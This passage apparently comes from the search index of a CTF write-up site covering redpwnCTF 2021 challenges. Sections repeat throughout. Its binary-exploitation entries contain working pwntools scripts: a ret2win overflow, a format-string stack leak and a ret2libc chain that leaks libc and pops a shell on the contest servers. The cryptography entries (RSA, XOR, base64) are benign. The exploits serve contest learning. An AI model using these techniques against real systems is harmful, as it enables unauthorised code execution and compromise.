\"./coffer-overflow-2\" host , port = \"2020.redpwnc.tf\" , 31908 conn = remote ( host , port ) elf = ELF ( local ) binFunction = elf . symbols [ \"binFunction\" ] size = 0x10 + 8 payload = \"A\" * size payload += p64 ( binFunction ) conn . recvuntil ( \"with?\" ) conn . recvline () conn . sendline ( payload ) conn . interactive () The flag \u00b6 As usual, we can cat out the flag in the shell. cat flag.txt flag { ret_to_b1n_m0re_l1k3_r3t_t0_w1n }","title":"coffer-overflow-2"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/coffer-overflow-2/#coffer-overflow-2","text":"This is the 3rd buffer overflow challeng, and it couldn't be done without some gdb .","title":"coffer-overflow-2"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/coffer-overflow-2/#the-source","text":"int main ( void ){ char name [ 16 ]; gets ( name ); } void binFunction () { system ( \"/bin/sh\" ); } As you can see, we don't get another variable for us to overflow, instead we have a function in outside main. This case, we want to alter the rip registerto the address of binFunction() so we can get that running. First of all, we need to find the return address of main and the address of binFunction()","title":"The source"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/coffer-overflow-2/#finding-addresses-manual","text":"We can use gdb to help us. gdb info functinos binFunction 0x00000000004006e6","title":"Finding Addresses (manual)"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/coffer-overflow-2/#the-exploit","text":"I wrote a python script(for this one, to automate it) to find the binFunction address and automatically generate and send the payload. from pwn import * import sys context ( os = 'linux' , arch = 'i386' ) local = \"./coffer-overflow-2\" host , port = \"2020.redpwnc.tf\" , 31908 conn = remote ( host , port ) elf = ELF ( local ) binFunction = elf . symbols [ \"binFunction\" ] size = 0x10 + 8 payload = \"A\" * size payload += p64 ( binFunction ) conn . recvuntil ( \"with?\" ) conn . recvline () conn . sendline ( payload ) conn . interactive ()","title":"The exploit"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/coffer-overflow-2/#the-flag","text":"As usual, we can cat out the flag in the shell. cat flag.txt flag { ret_to_b1n_m0re_l1k3_r3t_t0_w1n }","title":"The flag"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/secret-flag/","text":"secret-flag \u00b6 This is a typical printf() exploit as the challenge hints us There's a super secret flag in printf that allows you to LEAK the data at an address?? printf \u00b6 Printf is the format string function, by using different flags, we can get different types of variables. If nothing is specified to be the input and there fore nothing is placed on the stack, if we insert flags to printf, it will just read the data on the top of the stack down. We can use this \"bug\" to lead as much data as we want. the exploit \u00b6 We want to leak the values on the stack. First I tried to use the flags and see what we can get, but there is a twist What is your name, young adventurer? %s %s %s Hello there: Hello there: (null) (null) This one works out nicely, but check what happens when I enter more that 3 %s What is your name, young adventurer? %s %s %s %s Hello there: [1] 3000 segmentation fault (core dumped) ./secret-flag The program crashes! Apparently the flag should hid down the stack, but how can we get over this? Well we could use % #number $s , the number is how far you want to look back on the stack. By doing this, we could just request one stack location at a time but we can do this many times. So I wrote a script to do this script \u00b6 from pwn import * context . log_level = 'critical' host , port = \"2020.redpwnc.tf\" , 31826 for i in range ( 10 ): s = remote ( host , port ) s . recvline () s . recvline () s . sendline ( '%' + str ( i ) + '$s' ) try : responce = s . recvline () . decode ( \"utf-8\" ) print ( responce ) except : print ( \"Fault\" ) This is a simple script that crawls through 1-10 on the stack by running %5$s to find strings(we want string because the flag should be a string). We try to decode the recieve text to readable characters, and if it doesn't work, we just pass. OUTPUT: Hello there: %0$s Hello there: Hello there: Hello there: Fault Hello there: Fault Fault Hello there: flag{n0t_s0_s3cr3t_f1ag_n0w} Fault Fault And theres the flag on the stack somewhere!","title":"secret-flag"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/secret-flag/#secret-flag","text":"This is a typical printf() exploit as the challenge hints us There's a super secret flag in printf that allows you to LEAK the data at an address??","title":"secret-flag"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/secret-flag/#printf","text":"Printf is the format string function, by using different flags, we can get different types of variables. If nothing is specified to be the input and there fore nothing is placed on the stack, if we insert flags to printf, it will just read the data on the top of the stack down. We can use this \"bug\" to lead as much data as we want.","title":"printf"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/secret-flag/#the-exploit","text":"We want to leak the values on the stack. First I tried to use the flags and see what we can get, but there is a twist What is your name, young adventurer? %s %s %s Hello there: Hello there: (null) (null) This one works out nicely, but check what happens when I enter more that 3 %s What is your name, young adventurer? %s %s %s %s Hello there: [1] 3000 segmentation fault (core dumped) ./secret-flag The program crashes! Apparently the flag should hid down the stack, but how can we get over this? Well we could use % #number $s , the number is how far you want to look back on the stack. By doing this, we could just request one stack location at a time but we can do this many times. So I wrote a script to do this","title":"the exploit"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/secret-flag/#script","text":"from pwn import * context . log_level = 'critical' host , port = \"2020.redpwnc.tf\" , 31826 for i in range ( 10 ): s = remote ( host , port ) s . recvline () s . recvline () s . sendline ( '%' + str ( i ) + '$s' ) try : responce = s . recvline () . decode ( \"utf-8\" ) print ( responce ) except : print ( \"Fault\" ) This is a simple script that crawls through 1-10 on the stack by running %5$s to find strings(we want string because the flag should be a string). We try to decode the recieve text to readable characters, and if it doesn't work, we just pass. OUTPUT: Hello there: %0$s Hello there: Hello there: Hello there: Fault Hello there: Fault Fault Hello there: flag{n0t_s0_s3cr3t_f1ag_n0w} Fault Fault And theres the flag on the stack somewhere!","title":"script"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/the-library/","text":"the-library \u00b6 This is a classic ret2libc exploit, where we want the main fuctino to return to the libc file where we can access many usefull functions. ret2libc procedure \u00b6 To run a return to libc exploit, we need some fundemental elements. * libc position * libc version * function offsets * return to main * etc. First, we need to tackle the libc position. We need to find this on the remote server since it will be different on every machine. Also, the position will change each time we run the program due to ASLR , so we need to do the exploit in one run. libc position \u00b6 read ( 0 , name , 0x100 ); puts ( \"Hello there: \" ); puts ( name ); In the program, after the input we we can see that we have 2 puts() we could leverage using BOF . What we need to do is to first overflow to the rip registers then run pop_rdi gadget then put the global offset table value of puts into puts itself and we leaked the address of puts. With that and the original libc, we can locate the base pointer of libc . To find the symboles and GOT addresses, pwntools got us covered. The only thing we need to get is pop_rdi . We could use ropper to search for it. ropper -- file the-library --search \"% ?di\" 0x0000000000400733: pop rdi ; ret ; We got the address of the gadget and now we can try an write a script to leak the libc location. script \u00b6 from pwn import * host , port = \"2020.redpwnc.tf\" , 31350 p = connect ( host , port ) binary = ELF ( './the-library' ) libc = ELF ( './libc.so.6' ) JUNK = \"A\" * 24 main = binary . symbols [ 'main' ] got_puts = binary . got [ 'puts' ] plt_puts = binary . plt [ 'puts' ] pop_rdi = 0x400733 payload = JUNK payload += p64 ( pop_rdi ) payload += p64 ( got_puts ) payload += p64 ( plt_puts ) payload += p64 ( main ) p . recvline () p . sendline ( payload ) p . recvline () p . recvline () leaked_puts = u64 ( p . recvline () . strip () . ljust ( 8 , \" \\x00 \" )) libc_puts = libc . symbols [ 'puts' ] libc . address = leaked_puts - libc_puts log . success ( \"Leaked puts : {} \" . format ( hex ( leaked_puts ))) log . success ( \"Libc at : {} \" . format ( hex ( libc . address ))) By subtracting the leaked puts address and the libc puts location, we get the libc base pointer. Finding the version and offsets \u00b6 We could use libcdb to find the version of libc running with some address of a function. The site also has the offsets for functinos we need. libc6_2.27-3ubuntu1_amd64 libc6_2.3.6-0ubuntu20_i386_2 These are the versions that satisfy our leaked address, and obviously, we are running on a 64 bit architecture so amd64 is the way to go. Call Main \u00b6 We don't want the program to terminate at this point as all our effort into finding the libc will be lost as it will change next run. So, how do we execute the code again? Well, we could call main Getting a Shell \u00b6 We could obviously find the system() function and the /bin/sh gadget using pwntools, but when I was researching I found something called one_gadget . This is basically one single gadget that will pop a shell for you. And when I checked, it was compatible with our platform. Final Exploit \u00b6 Now we just need to leak the libc, run main, run onegadget and we got a shell. Here's the full script. from pwn import * host , port = \"2020.redpwnc.tf\" , 31350 p = connect ( host , port ) binary = ELF ( './the-library' ) libc = ELF ( './libc.so.6' ) JUNK = \"A\" * 24 main = binary . symbols [ 'main' ] got_puts = binary . got [ 'puts' ] plt_puts = binary . plt [ 'puts' ] pop_rdi = 0x400733 payload = JUNK payload += p64 ( pop_rdi ) payload += p64 ( got_puts ) payload += p64 ( plt_puts ) payload += p64 ( main ) p . recvline () p . sendline ( payload ) p . recvline () p . recvline () leaked_puts = u64 ( p . recvline () . strip () . ljust ( 8 , \" \\x00 \" )) libc_puts = libc . symbols [ 'puts' ] libc . address = leaked_puts - libc_puts log . success ( \"Leaked puts : {} \" . format ( hex ( leaked_puts ))) log . success ( \"Libc at : {} \" . format ( hex ( libc . address ))) libc_base = libc . address payload = JUNK one_gadget = p64 ( libc . address + 0x4f2c5 ) payload += one_gadget p . recvline () p . sendline ( payload ) p . interactive () Flag \u00b6 Cat out flag.txt cat flag.txt flag { jump_1nt0_th3_l1brary }","title":"the-library"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/the-library/#the-library","text":"This is a classic ret2libc exploit, where we want the main fuctino to return to the libc file where we can access many usefull functions.","title":"the-library"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/the-library/#ret2libc-procedure","text":"To run a return to libc exploit, we need some fundemental elements. * libc position * libc version * function offsets * return to main * etc. First, we need to tackle the libc position. We need to find this on the remote server since it will be different on every machine. Also, the position will change each time we run the program due to ASLR , so we need to do the exploit in one run.","title":"ret2libc procedure"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/the-library/#libc-position","text":"read ( 0 , name , 0x100 ); puts ( \"Hello there: \" ); puts ( name ); In the program, after the input we we can see that we have 2 puts() we could leverage using BOF . What we need to do is to first overflow to the rip registers then run pop_rdi gadget then put the global offset table value of puts into puts itself and we leaked the address of puts. With that and the original libc, we can locate the base pointer of libc . To find the symboles and GOT addresses, pwntools got us covered. The only thing we need to get is pop_rdi . We could use ropper to search for it. ropper -- file the-library --search \"% ?di\" 0x0000000000400733: pop rdi ; ret ; We got the address of the gadget and now we can try an write a script to leak the libc location.","title":"libc position"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/the-library/#script","text":"from pwn import * host , port = \"2020.redpwnc.tf\" , 31350 p = connect ( host , port ) binary = ELF ( './the-library' ) libc = ELF ( './libc.so.6' ) JUNK = \"A\" * 24 main = binary . symbols [ 'main' ] got_puts = binary . got [ 'puts' ] plt_puts = binary . plt [ 'puts' ] pop_rdi = 0x400733 payload = JUNK payload += p64 ( pop_rdi ) payload += p64 ( got_puts ) payload += p64 ( plt_puts ) payload += p64 ( main ) p . recvline () p . sendline ( payload ) p . recvline () p . recvline () leaked_puts = u64 ( p . recvline () . strip () . ljust ( 8 , \" \\x00 \" )) libc_puts = libc . symbols [ 'puts' ] libc . address = leaked_puts - libc_puts log . success ( \"Leaked puts : {} \" . format ( hex ( leaked_puts ))) log . success ( \"Libc at : {} \" . format ( hex ( libc . address ))) By subtracting the leaked puts address and the libc puts location, we get the libc base pointer.","title":"script"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/the-library/#finding-the-version-and-offsets","text":"We could use libcdb to find the version of libc running with some address of a function. The site also has the offsets for functinos we need. libc6_2.27-3ubuntu1_amd64 libc6_2.3.6-0ubuntu20_i386_2 These are the versions that satisfy our leaked address, and obviously, we are running on a 64 bit architecture so amd64 is the way to go.","title":"Finding the version and offsets"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/the-library/#call-main","text":"We don't want the program to terminate at this point as all our effort into finding the libc will be lost as it will change next run. So, how do we execute the code again? Well, we could call main","title":"Call Main"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/the-library/#getting-a-shell","text":"We could obviously find the system() function and the /bin/sh gadget using pwntools, but when I was researching I found something called one_gadget . This is basically one single gadget that will pop a shell for you. And when I checked, it was compatible with our platform.","title":"Getting a Shell"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/the-library/#final-exploit","text":"Now we just need to leak the libc, run main, run onegadget and we got a shell. Here's the full script. from pwn import * host , port = \"2020.redpwnc.tf\" , 31350 p = connect ( host , port ) binary = ELF ( './the-library' ) libc = ELF ( './libc.so.6' ) JUNK = \"A\" * 24 main = binary . symbols [ 'main' ] got_puts = binary . got [ 'puts' ] plt_puts = binary . plt [ 'puts' ] pop_rdi = 0x400733 payload = JUNK payload += p64 ( pop_rdi ) payload += p64 ( got_puts ) payload += p64 ( plt_puts ) payload += p64 ( main ) p . recvline () p . sendline ( payload ) p . recvline () p . recvline () leaked_puts = u64 ( p . recvline () . strip () . ljust ( 8 , \" \\x00 \" )) libc_puts = libc . symbols [ 'puts' ] libc . address = leaked_puts - libc_puts log . success ( \"Leaked puts : {} \" . format ( hex ( leaked_puts ))) log . success ( \"Libc at : {} \" . format ( hex ( libc . address ))) libc_base = libc . address payload = JUNK one_gadget = p64 ( libc . address + 0x4f2c5 ) payload += one_gadget p . recvline () p . sendline ( payload ) p . interactive ()","title":"Final Exploit"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/the-library/#flag","text":"Cat out flag.txt cat flag.txt flag { jump_1nt0_th3_l1brary }","title":"Flag"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/4k-rsa/","text":"4k RSA \u00b6 This is a classic RSA question where we were given n e and c . In this case to decipher c we need to find d which is the modular inverse of the totient and e . Finding the Totient \u00b6 To find the Eulers Totient we need to find the factors of n. Then we could put it in this equation since we know that all of n's factors are prime phi = (p0-1)(p1-1)...(pn-1) To factor a large number like n we could of course use the Python Crypto module but we can search for the number on factordb . Prime Factorization \u00b6 We input n into factordb and indeed it is already FF(fully factored) primes = [ 9353689450544968301 , 9431486459129385713 , 9563871376496945939 , 9734621099746950389 , 9736426554597289187 , 10035211751896066517 , 10040518276351167659 , 10181432127731860643 , 10207091564737615283 , 10435329529687076341 , 10498390163702844413 , 10795203922067072869 , 11172074163972443279 , 11177660664692929397 , 11485099149552071347 , 11616532426455948319 , 11964233629849590781 , 11992188644420662609 , 12084363952563914161 , 12264277362666379411 , 12284357139600907033 , 12726850839407946047 , 13115347801685269351 , 13330028326583914849 , 13447718068162387333 , 13554661643603143669 , 13558122110214876367 , 13579057804448354623 , 13716062103239551021 , 13789440402687036193 , 13856162412093479449 , 13857614679626144761 , 14296909550165083981 , 14302754311314161101 , 14636284106789671351 , 14764546515788021591 , 14893589315557698913 , 15067220807972526163 , 15241351646164982941 , 15407706505172751449 , 15524931816063806341 , 15525253577632484267 , 15549005882626828981 , 15687871802768704433 , 15720375559558820789 , 15734713257994215871 , 15742065469952258753 , 15861836139507191959 , 16136191597900016651 , 16154675571631982029 , 16175693991682950929 , 16418126406213832189 , 16568399117655835211 , 16618761350345493811 , 16663643217910267123 , 16750888032920189263 , 16796967566363355967 , 16842398522466619901 , 17472599467110501143 , 17616950931512191043 , 17825248785173311981 , 18268960885156297373 , 18311624754015021467 , 18415126952549973977 ] This is the prime factorization of n Script \u00b6 To find the totient phi, and find the final plaintext, I wrote a small python script to automate the process. I skiped the RSA values as they take up to much space. They could be sound in the provided txt file. from Crypto.Util.number import inverse n = #n from provided txt file e = 65537 c = #c from provided txt file primes = #the primes listed above. Don't want to showcase twice as there is quite a lot of them. phi = 1 for x in primes : phi = phi * ( x - 1 ) d = inverse ( e , phi ) m = pow ( c , d , n ) print ( hex ( m )) Essentially, we set phi to one and multiply it to the next prime factor of n minus one. Then we get d by doing the moduler inverse of the public exponent and phi. To solve the plaintext, we just need to raise c to the power of d mod n .","title":"4k RSA"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/4k-rsa/#4k-rsa","text":"This is a classic RSA question where we were given n e and c . In this case to decipher c we need to find d which is the modular inverse of the totient and e .","title":"4k RSA"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/4k-rsa/#finding-the-totient","text":"To find the Eulers Totient we need to find the factors of n. Then we could put it in this equation since we know that all of n's factors are prime phi = (p0-1)(p1-1)...(pn-1) To factor a large number like n we could of course use the Python Crypto module but we can search for the number on factordb .","title":"Finding the Totient"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/4k-rsa/#prime-factorization","text":"We input n into factordb and indeed it is already FF(fully factored) primes = [ 9353689450544968301 , 9431486459129385713 , 9563871376496945939 , 9734621099746950389 , 9736426554597289187 , 10035211751896066517 , 10040518276351167659 , 10181432127731860643 , 10207091564737615283 , 10435329529687076341 , 10498390163702844413 , 10795203922067072869 , 11172074163972443279 , 11177660664692929397 , 11485099149552071347 , 11616532426455948319 , 11964233629849590781 , 11992188644420662609 , 12084363952563914161 , 12264277362666379411 , 12284357139600907033 , 12726850839407946047 , 13115347801685269351 , 13330028326583914849 , 13447718068162387333 , 13554661643603143669 , 13558122110214876367 , 13579057804448354623 , 13716062103239551021 , 13789440402687036193 , 13856162412093479449 , 13857614679626144761 , 14296909550165083981 , 14302754311314161101 , 14636284106789671351 , 14764546515788021591 , 14893589315557698913 , 15067220807972526163 , 15241351646164982941 , 15407706505172751449 , 15524931816063806341 , 15525253577632484267 , 15549005882626828981 , 15687871802768704433 , 15720375559558820789 , 15734713257994215871 , 15742065469952258753 , 15861836139507191959 , 16136191597900016651 , 16154675571631982029 , 16175693991682950929 , 16418126406213832189 , 16568399117655835211 , 16618761350345493811 , 16663643217910267123 , 16750888032920189263 , 16796967566363355967 , 16842398522466619901 , 17472599467110501143 , 17616950931512191043 , 17825248785173311981 , 18268960885156297373 , 18311624754015021467 , 18415126952549973977 ] This is the prime factorization of n","title":"Prime Factorization"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/4k-rsa/#script","text":"To find the totient phi, and find the final plaintext, I wrote a small python script to automate the process. I skiped the RSA values as they take up to much space. They could be sound in the provided txt file. from Crypto.Util.number import inverse n = #n from provided txt file e = 65537 c = #c from provided txt file primes = #the primes listed above. Don't want to showcase twice as there is quite a lot of them. phi = 1 for x in primes : phi = phi * ( x - 1 ) d = inverse ( e , phi ) m = pow ( c , d , n ) print ( hex ( m )) Essentially, we set phi to one and multiply it to the next prime factor of n minus one. Then we get d by doing the moduler inverse of the public exponent and phi. To solve the plaintext, we just need to raise c to the power of d mod n .","title":"Script"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/alien-transmission-v2/","text":"alien tx v2 \u00b6 We are provede with an explanation that has some key points and a file that contains the doble XOR encrypted message. The aliens are at it again! We've discovered that their communications are in base 512 and have transcribed them in base 10. However, it seems like they used XOR encryption twice with two different keys! We do have some information: This alien language consists of words delimitated by the character represented as 481 The two keys appear to be of length 21 and 19 The value of each character in these keys does not exceed 255 Find these two keys for me; concatenate their ASCII encodings and wrap it in the flag format. Our goal here is to recover the two keys but not the message. So we could leverage the message and the special factors of the alens language to \"guess\" the keys. Effective Key Length \u00b6 By doing an XOR encryption with a key length of 21 and 19, we have a effective key length of 21*19=399 . This means that the text will be encrypted by the same key every 399 chars. Heres a visualization. key1 = 101 key2 = 11010 plaintext = 00000 First XOR with key1 10110 ('101' plus '10' to fill the length of the plaintext) XOR 00000 ------------------ 10110 Second XOR with key2 10110 XOR 11010 ------------------ 01100 You can see the result more clearly with a test script @GeoffreyY(Discord) showed me from itertools import cycle key1 = [ 1 , 2 , 3 ] key2 = [ 4 , 5 , 6 , 7 , 8 ] ptxt = [ 0 ] * 50 [ z ^ k1 ^ k2 for (( z , k1 ), k2 ) in zip ( zip ( ptxt , cycle ( key1 ), cycle ( key2 )))] OUTPUT : [ 5 , 7 , 5 , 6 , 10 , 7 , 4 , 4 , 4 , 9 , 6 , 6 , 7 , 5 , 11 5 , 7 , 5 , 6 , 10 , 7 , 4 , 4 , 4 , 9 , 6 , 6 , 7 , 5 , 11 5 , 7 , 5 , 6 , 10 ] Sorting \u00b6 After we determine the effective key length, we could sort the provide alien message into 399 different bins, as each bin is using the same key to encrypt the data. To do this, a python script could do the job, this will be included in the final exploit. from collections import * encrypted = open ( \"encrypted.txt\" , 'r' ) . read () . strip () . split ( ' \\n ' ) bins = defaultdict ( list ) k399 = [ 0 ] * 399 k21 = []( #)*21 k19 = []( #)*19 for x in range ( len ( encrypted )): bins [ x % 399 ] . append ( encrypted [ x ]) Finding Deliminators \u00b6 By the provided imformation about the alien language, we know that the deliminator is 481 and that should be the most common \"word\" in each bin. By using the Counter() in itertools, we can see that there is always a significant difference between the most used word and the second most used word. Therefore, we could tell that the most used word in each bin should be 481 . Now we need a piece of script to pick out these deliminators. for x in range ( 0 , 399 ): count = Counter ( bins [ x ]) delim = list ( count . keys ())[ list ( count . values ()) . index ( max ( list ( count . values ())))] k399 [ x ] = int ( delim ) ^ 481 After finding the deliminators, by XORing it with 481 the knowned deliminator, we can get the encryption key for k399[i] \"Brute Forcing\" the Keys \u00b6 We know the relation of key399 , key21 and key19 by examining the test script @GeoffreyY wrote which is key399[i] = key21[i % 21] ^ key19[i % 19] By knowing this imformation in addition to the other specification of the alien language The value of each character in these keys does not exceed 255 we can try every value between 0 ~ 255 . Since we know all k399 by finding the deliminators, we just need to guess a value for k21 or k19 and see if the other one makes sence, since we want our final output to be readable characters. I wrote this script that will write all the posibilities of k19 when k21 is a certain value, and evaluate k21 with the found k19 value and k399 . with open ( \"ape1.txt\" , 'w' ) as f : with open ( \"ape.txt\" , 'w' ) as j : for c in range ( 0 , 255 ): for idx in range ( 0 , 399 , 21 ): k19 [ idx % 19 ] = k399 [ idx ] ^ c f . write ( \"\" . join ([ chr ( c ) for c in k19 ]) + ' \\n ' ) for i in range ( 0 , 399 ): k21 [ i % 21 ] = k19 [ i % 19 ] ^ k399 [ i ] j . write ( \"\" . join ([ chr ( c ) for c in k21 ]) + \"\" . join ([ chr ( c ) for c in k19 ]) + ' \\n ' ) Final Output and Finding the Flag \u00b6 For our output, we get a huge list of characters and we need to find the one that \"looks\" right. . . .(Giberish) e>\u007f>*8Rye>Rk<\u007f8yRe9akRye>R8>n=ciR<8Rye<8 f=|=);Qzf=Qh?|;zQf:bhQzf=Q;=m>`jQ?;Qzf?; g<}<(:P{g<Pi>}:{Pg;ciP{g<P:<l?akP>:P{g>: h3r3'5_th3_f1r5t_h4lf_th3_53c0nd_15_th15 i2s2&4^ui2^g0s4u^i5mg^ui2^42b1oe^04^ui04 j1p1%7]vj1]d3p7v]j6nd]vj1]71a2lf]37]vj37 k0q0$6\\wk0\\e2q6w\\k7oe\\wk0\\60`3mg\\26\\wk26 .(Giberish) . . Just find the string that \"Seems\" like the flag, you should be able to spot it!","title":"alien tx v2"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/alien-transmission-v2/#alien-tx-v2","text":"We are provede with an explanation that has some key points and a file that contains the doble XOR encrypted message. The aliens are at it again! We've discovered that their communications are in base 512 and have transcribed them in base 10. However, it seems like they used XOR encryption twice with two different keys! We do have some information: This alien language consists of words delimitated by the character represented as 481 The two keys appear to be of length 21 and 19 The value of each character in these keys does not exceed 255 Find these two keys for me; concatenate their ASCII encodings and wrap it in the flag format. Our goal here is to recover the two keys but not the message. So we could leverage the message and the special factors of the alens language to \"guess\" the keys.","title":"alien tx v2"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/alien-transmission-v2/#effective-key-length","text":"By doing an XOR encryption with a key length of 21 and 19, we have a effective key length of 21*19=399 . This means that the text will be encrypted by the same key every 399 chars. Heres a visualization. key1 = 101 key2 = 11010 plaintext = 00000 First XOR with key1 10110 ('101' plus '10' to fill the length of the plaintext) XOR 00000 ------------------ 10110 Second XOR with key2 10110 XOR 11010 ------------------ 01100 You can see the result more clearly with a test script @GeoffreyY(Discord) showed me from itertools import cycle key1 = [ 1 , 2 , 3 ] key2 = [ 4 , 5 , 6 , 7 , 8 ] ptxt = [ 0 ] * 50 [ z ^ k1 ^ k2 for (( z , k1 ), k2 ) in zip ( zip ( ptxt , cycle ( key1 ), cycle ( key2 )))] OUTPUT : [ 5 , 7 , 5 , 6 , 10 , 7 , 4 , 4 , 4 , 9 , 6 , 6 , 7 , 5 , 11 5 , 7 , 5 , 6 , 10 , 7 , 4 , 4 , 4 , 9 , 6 , 6 , 7 , 5 , 11 5 , 7 , 5 , 6 , 10 ]","title":"Effective Key Length"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/alien-transmission-v2/#sorting","text":"After we determine the effective key length, we could sort the provide alien message into 399 different bins, as each bin is using the same key to encrypt the data. To do this, a python script could do the job, this will be included in the final exploit. from collections import * encrypted = open ( \"encrypted.txt\" , 'r' ) . read () . strip () . split ( ' \\n ' ) bins = defaultdict ( list ) k399 = [ 0 ] * 399 k21 = []( #)*21 k19 = []( #)*19 for x in range ( len ( encrypted )): bins [ x % 399 ] . append ( encrypted [ x ])","title":"Sorting"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/alien-transmission-v2/#finding-deliminators","text":"By the provided imformation about the alien language, we know that the deliminator is 481 and that should be the most common \"word\" in each bin. By using the Counter() in itertools, we can see that there is always a significant difference between the most used word and the second most used word. Therefore, we could tell that the most used word in each bin should be 481 . Now we need a piece of script to pick out these deliminators. for x in range ( 0 , 399 ): count = Counter ( bins [ x ]) delim = list ( count . keys ())[ list ( count . values ()) . index ( max ( list ( count . values ())))] k399 [ x ] = int ( delim ) ^ 481 After finding the deliminators, by XORing it with 481 the knowned deliminator, we can get the encryption key for k399[i]","title":"Finding Deliminators"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/alien-transmission-v2/#brute-forcing-the-keys","text":"We know the relation of key399 , key21 and key19 by examining the test script @GeoffreyY wrote which is key399[i] = key21[i % 21] ^ key19[i % 19] By knowing this imformation in addition to the other specification of the alien language The value of each character in these keys does not exceed 255 we can try every value between 0 ~ 255 . Since we know all k399 by finding the deliminators, we just need to guess a value for k21 or k19 and see if the other one makes sence, since we want our final output to be readable characters. I wrote this script that will write all the posibilities of k19 when k21 is a certain value, and evaluate k21 with the found k19 value and k399 . with open ( \"ape1.txt\" , 'w' ) as f : with open ( \"ape.txt\" , 'w' ) as j : for c in range ( 0 , 255 ): for idx in range ( 0 , 399 , 21 ): k19 [ idx % 19 ] = k399 [ idx ] ^ c f . write ( \"\" . join ([ chr ( c ) for c in k19 ]) + ' \\n ' ) for i in range ( 0 , 399 ): k21 [ i % 21 ] = k19 [ i % 19 ] ^ k399 [ i ] j . write ( \"\" . join ([ chr ( c ) for c in k21 ]) + \"\" . join ([ chr ( c ) for c in k19 ]) + ' \\n ' )","title":"\"Brute Forcing\" the Keys"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/alien-transmission-v2/#final-output-and-finding-the-flag","text":"For our output, we get a huge list of characters and we need to find the one that \"looks\" right. . . .(Giberish) e>\u007f>*8Rye>Rk<\u007f8yRe9akRye>R8>n=ciR<8Rye<8 f=|=);Qzf=Qh?|;zQf:bhQzf=Q;=m>`jQ?;Qzf?; g<}<(:P{g<Pi>}:{Pg;ciP{g<P:<l?akP>:P{g>: h3r3'5_th3_f1r5t_h4lf_th3_53c0nd_15_th15 i2s2&4^ui2^g0s4u^i5mg^ui2^42b1oe^04^ui04 j1p1%7]vj1]d3p7v]j6nd]vj1]71a2lf]37]vj37 k0q0$6\\wk0\\e2q6w\\k7oe\\wk0\\60`3mg\\26\\wk26 .(Giberish) . . Just find the string that \"Seems\" like the flag, you should be able to spot it!","title":"Final Output and Finding the Flag"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/base64/","text":"base646464 \u00b6 As the name suggest, you could already tell that this challenge is about decoding base 64 encoded strings. We were given a txt file that contains a encoded string, and a generate.js file that shows how the encoding works. Experienced CTF Player \u00b6 If you have participated in CTF games, you might be able to pull off this challenge without even looking at the source code. What I did was run base64 --decode a lot of times in bash and I was able to get the answer. This might seem abundant, but it's a good way to get a quick flag without writing a script. cat cipher.txt | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode Examine the Source Code \u00b6 Here's the source code of the generate.js file: const btoa = str => Buffer . from ( str ). toString ( 'base64' ); const fs = require ( \"fs\" ); const flag = fs . readFileSync ( \"flag.txt\" , \"utf8\" ). trim (); let ret = flag ; for ( let i = 0 ; i < 25 ; i ++ ) ret = btoa ( ret ); fs . writeFileSync ( \"cipher.txt\" , ret ); From the first like, we know that the functino btoa uses base64 encoding to encode the passed in str string. Then this functino is calleng 25 times in the for loop. So what we have to do decode the input cipher 25 times in base 64. Python Script \u00b6 We can use the python base64 module to handle the diciphering. All we need to do is run base64 decode 25 times and we sholud get the flag. import base64 f = open ( 'cipher.txt' , 'r' ) cipher = f . read () ptxt = cipher for i in range ( 25 ): ptxt = base64 . b64decode ( ptxt ) print ( ptxt ) Output : python3 ape.py b 'flag{l00ks_l1ke_a_l0t_of_64s}'","title":"base646464"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/base64/#base646464","text":"As the name suggest, you could already tell that this challenge is about decoding base 64 encoded strings. We were given a txt file that contains a encoded string, and a generate.js file that shows how the encoding works.","title":"base646464"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/base64/#experienced-ctf-player","text":"If you have participated in CTF games, you might be able to pull off this challenge without even looking at the source code. What I did was run base64 --decode a lot of times in bash and I was able to get the answer. This might seem abundant, but it's a good way to get a quick flag without writing a script. cat cipher.txt | base64 --decode | base64 --decode | base64 --decode | 